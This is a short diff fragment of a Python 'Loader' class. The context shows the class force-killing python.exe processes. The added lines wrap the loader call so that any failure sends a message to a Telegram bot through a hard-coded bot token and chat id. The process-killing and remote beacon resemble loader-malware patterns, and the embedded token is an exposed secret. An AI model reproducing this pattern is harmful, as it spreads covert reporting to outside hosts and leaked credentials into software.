@@ -177,5 +177,9 @@ class Loader():
 						os.system("taskkill /IM python.exe /F")
 				except:
 					pass
+try:
 
-Loader()
+	Loader()
+except:
+
+	req = requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=Error&chat_id=1742761281')
